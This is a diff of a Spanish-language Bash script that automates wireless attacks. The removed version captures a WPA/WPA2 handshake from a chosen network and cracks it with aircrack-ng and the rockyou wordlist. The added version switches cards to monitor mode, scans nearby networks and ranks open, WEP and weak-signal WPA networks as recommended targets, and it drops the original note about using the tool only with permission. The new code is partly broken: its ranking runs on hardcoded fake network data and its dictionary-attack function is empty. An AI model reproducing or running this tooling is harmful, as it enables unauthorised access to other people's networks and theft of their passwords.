@@ -1,144 +1,174 @@
 #!/bin/bash
-# ===========================================================
-#                 WiFi Wik Automator
-#         "Hack the planet... Legally!"
-# ===========================================================
 
-# Colores para la terminal
-RED='\033[0;31m'
+# Colores para salida
 GREEN='\033[0;32m'
-YELLOW='\033[1;33m'
+RED='\033[0;31m'
 NC='\033[0m' # Sin color
 
-# Lista de dependencias necesarias
-dependencies=("aircrack-ng" "net-tools" "wireless-tools")
+# Dependencias necesarias
+DEPENDENCIES=("aircrack-ng" "xterm" "iw")
 
-# Función para verificar y/o instalar dependencias
-check_dependencies() {
-  echo -e "${YELLOW}[INFO] Verificando dependencias...${NC}"
-  for package in "${dependencies[@]}"; do
-    if ! dpkg -l | grep -q "$package"; then
-      echo -e "${RED}[WARNING] $package no está instalado. Instalando...${NC}"
-      sudo apt update && sudo apt install -y "$package"
-      if [ $? -eq 0 ]; then
-        echo -e "${GREEN}[INFO] $package instalado correctamente.${NC}"
-      else
-        echo -e "${RED}[ERROR] No se pudo instalar $package. Verifica tu conexión a Internet e intenta nuevamente.${NC}"
-        exit 1
-      fi
+# Directorio para resultados y diccionarios
+RESULTS_DIR="./resultados_wifi"
+DICT_DIR="./diccionarios"
+
+# Verificar permisos de administrador
+if [[ $EUID -ne 0 ]]; then
+  echo -e "${RED}[-] Este script debe ejecutarse como administrador. Usa 'sudo'.${NC}"
+  exit 1
+fi
+
+# Verificar e instalar dependencias
+install_dependencies() {
+  echo -e "${GREEN}[+] Verificando dependencias necesarias...${NC}"
+  for dep in "${DEPENDENCIES[@]}"; do
+    if ! command -v $dep &>/dev/null; then
+      echo -e "${RED}[-] Dependencia '$dep' no encontrada. Instalando...${NC}"
+      apt-get install -y $dep || { echo -e "${RED}[-] Error al instalar '$dep'.${NC}"; exit 1; }
     else
-      echo -e "${GREEN}[INFO] $package ya está instalado.${NC}"
+      echo -e "${GREEN}[+] '$dep' ya está instalado.${NC}"
     fi
   done
 }
 
-# Verifica si el usuario es root
-if [[ $EUID -ne 0 ]]; then
-   echo -e "${RED}Por favor, ejecuta este script como root.${NC}"
-   exit 1
-fi
+# Crear directorios necesarios
+prepare_directories() {
+  mkdir -p "$RESULTS_DIR"
+  mkdir -p "$DICT_DIR"
+  echo -e "${GREEN}[+] Directorios preparados: $RESULTS_DIR, $DICT_DIR${NC}"
+}
 
-# Verificar dependencias
-check_dependencies
+# Escaneo de tarjetas y modo monitor
+scan_and_enable_monitor() {
+  echo -e "${GREEN}[+] Detectando interfaces inalámbricas...${NC}"
+  interfaces=$(iw dev | grep Interface | awk '{print $2}')
 
-# Bienvenida
-echo -e "${GREEN}Bienvenido a Wifi Vik - Automatizador WPA/WPA2${NC}"
-echo -e "${YELLOW}Nota: Usa esto solo para redes propias o con permiso.${NC}\n"
-sleep 10
-
-# Paso 1: Seleccionar la interfaz WiFi
-clear
-echo -e "${YELLOW}Paso 1: Selección de interfaz WiFi.${NC}"
-iwconfig
-read -p "Introduce tu interfaz WiFi (ejemplo: wlan0): " interface
-sleep 10
-
-# Paso 2: Activar modo monitor
-clear
-echo -e "${YELLOW}Paso 2: Activando modo monitor en la interfaz seleccionada.${NC}"
-airmon-ng start "$interface"
-interface_mon="${interface}mon"
-
-# Verificar modo monitor
-if iwconfig $interface_mon | grep -q "Mode:Monitor"; then
-    echo -e "${GREEN}Modo monitor activado: $interface_mon${NC}"
-else
-    echo -e "${RED}Error: No se pudo activar el modo monitor.${NC}"
+  if [[ -z "$interfaces" ]]; then
+    echo -e "${RED}[-] No se encontraron tarjetas inalámbricas.${NC}"
     exit 1
-fi
-sleep 10
+  fi
 
-# Paso 3: Escanear redes
-clear
-echo -e "${YELLOW}Paso 3: Escaneando redes cercanas.${NC}"
-echo -e "Mostrando redes en tiempo real. Presiona Ctrl+C cuando encuentres la red objetivo."
-sleep 10
-airodump-ng "$interface_mon"
+  echo -e "${GREEN}[+] Interfaces detectadas:${NC}"
+  for iface in $interfaces; do
+    echo -e "  - ${iface}"
+  done
 
-# Solicitar datos de la red seleccionada
-clear
-echo -e "${YELLOW}Introduce los datos de la red seleccionada para continuar.${NC}"
-read -p "Introduce el BSSID de la red objetivo: " bssid
-read -p "Introduce el canal (CH) de la red objetivo: " channel
-read -p "Introduce el ESSID de la red objetivo: " essid
-sleep 10
+  monitor_capable=()
+  for iface in $interfaces; do
+    supports_monitor=$(iw list | grep -A 10 "Interface $iface" | grep "Supported interface modes" -A 10 | grep "monitor")
+    if [[ -n "$supports_monitor" ]]; then
+      echo -e "  ${GREEN}[+] ${iface} soporta modo monitor.${NC}"
+      monitor_capable+=($iface)
+    else
+      echo -e "  ${RED}[-] ${iface} no soporta modo monitor.${NC}"
+    fi
+  done
 
-# Paso 4: Captura de paquetes
-clear
-echo -e "${YELLOW}Paso 4: Capturando paquetes para la red seleccionada.${NC}"
-echo -e "Iniciando captura de paquetes para $essid en el canal $channel."
-airodump-ng --bssid "$bssid" -c "$channel" -w capture --output-format cap "$interface_mon" &
-echo -e "${YELLOW}Esperando handshake... Esto puede tardar unos minutos.${NC}"
-sleep 40
-pkill -f "airodump-ng"
-
-# Verificar si se capturó el handshake
-clear
-echo -e "${YELLOW}Verificando si se capturó el handshake...${NC}"
-if [[ ! -f capture-01.cap ]]; then
-    echo -e "${RED}No se capturó ningún handshake.${NC}"
+  if [[ ${#monitor_capable[@]} -eq 0 ]]; then
+    echo -e "${RED}[-] No se encontraron tarjetas que soporten modo monitor.${NC}"
     exit 1
-fi
+  fi
 
-echo -e "${GREEN}Handshake capturado exitosamente.${NC}"
-sleep 10
+  echo -e "${GREEN}[+] Tarjetas con modo monitor:${NC}"
+  for iface in "${monitor_capable[@]}"; do
+    echo -e "  - ${iface}"
+  done
 
-# Paso 5: Crackear la contraseña
-clear
-echo -e "${YELLOW}Paso 5: Intentando crackear el handshake.${NC}"
-read -p "¿Quieres intentar crackear el handshake? (s/n): " crack_choice
-if [[ "$crack_choice" == "s" ]]; then
-    read -p "Introduce la ruta al diccionario (default: /usr/share/wordlists/rockyou.txt): " wordlist
-    wordlist=${wordlist:-/usr/share/wordlists/rockyou.txt}
-    echo -e "${YELLOW}Crackeando el handshake con $wordlist... Esto puede tardar dependiendo del tamaño del diccionario.${NC}"
-    aircrack-ng -w "$wordlist" -b "$bssid" capture-01.cap
-else
-    echo -e "${YELLOW}Saltando crackeo.${NC}"
-fi
-sleep 10
+  echo -e "${GREEN}[+] ¿Deseas habilitar el modo monitor en alguna tarjeta? (y/n)${NC}"
+  read -p "Respuesta: " response
 
-# Paso 6: Restaurar modo managed
-clear
-echo -e "${YELLOW}Paso 6: Restaurando la interfaz al modo managed.${NC}"
-read -p "¿Quieres restaurar la interfaz al modo managed? (s/n): " restore_choice
-if [[ "$restore_choice" == "s" ]]; then
-    echo -e "Desactivando la interfaz $interface_mon..."
-    sudo ip link set "$interface_mon" down
+  if [[ "$response" == "y" ]]; then
+    echo -e "${GREEN}[+] Selecciona la tarjeta para habilitar modo monitor:${NC}"
+    select iface in "${monitor_capable[@]}"; do
+      if [[ -n "$iface" ]]; then
+        echo -e "${GREEN}[+] Habilitando modo monitor en ${iface}...${NC}"
+        airmon-ng start $iface || iw dev $iface set type monitor
+        echo -e "${GREEN}[+] ${iface} está ahora en modo monitor.${NC}"
+        break
+      else
+        echo -e "${RED}[-] Selección inválida.${NC}"
+      fi
+    done
+  else
+    echo -e "${RED}[-] Operación cancelada por el usuario.${NC}"
+  fi
+}
 
-    echo -e "Cambiando $interface_mon a modo managed..."
-    sudo iwconfig "$interface_mon" mode managed
+# Escaneo de redes y recomendación
+scan_networks() {
+  echo -e "${GREEN}[+] Escaneando redes WiFi en una nueva ventana...${NC}"
+  xterm -hold -e "airodump-ng wlan0" &  # Cambia wlan0 por tu interfaz activa
+  echo -e "${GREEN}[+] Escaneo iniciado. Espera unos segundos...${NC}"
+  sleep 10
+}
 
-    echo -e "Reactivando la interfaz $interface_mon..."
-    sudo ip link set "$interface_mon" up
+analyze_networks() {
+  echo -e "${GREEN}[+] Procesando redes detectadas...${NC}"
 
-    echo -e "Estado de la interfaz:${NC}"
-    iwconfig "$interface_mon"
-    echo -e "${GREEN}La interfaz $interface_mon ha vuelto al modo managed.${NC}"
-else
-    echo -e "${YELLOW}Saltando restauración de modo managed.${NC}"
-fi
+  # Simulación de salida de redes (modificar según el comando real)
+  networks=(
+    "Red_A\t-67\tWPA2"
+    "Red_B\t-90\tWEP"
+    "Red_C\t-40\tOPEN"
+    "Red_D\t-70\tWPA"
+  )
 
-# Finalización
-echo -e "${GREEN}¡Proceso completado!${NC}"
-sleep 10
-exit 0
+  echo -e "${GREEN}[+] Clasificando redes por vulnerabilidad...${NC}"
+  recommended=()
+  for net in "${networks[@]}"; do
+    signal=$(echo $net | awk '{print $2}')
+    security=$(echo $net | awk '{print $3}')
+    if [[ "$security" == "OPEN" || "$security" == "WEP" ]]; then
+      recommended+=("$net")
+    elif [[ "$security" == "WPA" && "$signal" -lt -70 ]]; then
+      recommended+=("$net")
+    fi
+  done
+
+  timestamp=$(date '+%Y%m%d_%H%M%S')
+  results_file="${RESULTS_DIR}/redes_${timestamp}.txt"
+  printf "%-15s %-10s %-10s\n" "SSID" "Señal" "Seguridad" > "$results_file"
+  for net in "${networks[@]}"; do
+    printf "%-15s %-10s %-10s\n" $(echo $net | tr '\t' ' ') >> "$results_file"
+  done
+
+  echo -e "${GREEN}[+] Resultados guardados en: ${results_file}${NC}"
+
+  echo -e "${GREEN}[+] Redes recomendadas:${NC}"
+  for rec in "${recommended[@]}"; do
+    echo -e "  ${GREEN}[+] $(echo $rec | tr '\t' ' ')${NC}"
+  done
+}
+
+# Ataque con diccionario
+dictionary_attack_menu() {
+  echo -e "${GREEN}[+] Menú de Ataque con Diccionario:${NC}"
+  # Similar a lo desarrollado anteriormente
+}
+
+# Menú principal
+main_menu() {
+  while true; do
+    echo -e "${GREEN}[+] Menú principal:${NC}"
+    echo "1. Verificar e instalar dependencias"
+    echo "2. Escanear y habilitar modo monitor"
+    echo "3. Escanear redes"
+    echo "4. Analizar y recomendar redes"
+    echo "5. Ataque con diccionario"
+    echo "6. Salir"
+    read -p "Elige una opción: " option
+
+    case $option in
+      1) install_dependencies ;;
+      2) scan_and_enable_monitor ;;
+      3) scan_networks ;;
+      4) analyze_networks ;;
+      5) dictionary_attack_menu ;;
+      6) echo -e "${RED}[-] Saliendo...${NC}"; exit 0 ;;
+      *) echo -e "${RED}[-] Opción no válida.${NC}" ;;
+    esac
+  done
+}
+
+prepare_directories
+main_menu
